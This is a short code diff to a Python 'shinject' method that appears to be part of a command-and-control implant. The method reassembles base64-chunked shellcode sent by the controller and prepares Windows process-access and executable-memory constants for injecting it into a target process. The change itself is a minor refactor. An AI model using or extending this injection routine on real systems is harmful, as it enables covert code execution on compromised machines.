@@ -1,5 +1,6 @@
     def shinject(self, task_id, shellcode, process_id):
         from ctypes import windll,c_int,byref,c_ulong
+        from base64 import b64decode
         total_chunks = 1
         chunk_num = 0
         sc = b""
@@ -14,11 +15,11 @@
             chunk = response["responses"][0]
             chunk_num+=1
             total_chunks = chunk["total_chunks"]
-            sc+=base64.b64decode(chunk["chunk_data"])
+            sc+=b64decode(chunk["chunk_data"])
 
-        PAGE_EXECUTE_READWRITE = 0x40
-        PROCESS_ALL_ACCESS = 0x1fffff
-        VIRTUAL_MEM  = 0x3000
+        PAGE_EXECUTE_READWRITE = 0x00000040
+        PROCESS_ALL_ACCESS = ( 0x000F0000 | 0x00100000 | 0xFFF )
+        VIRTUAL_MEM  = ( 0x1000 | 0x2000 )
 
         kernel32 = windll.kernel32
         code_size = len(sc)
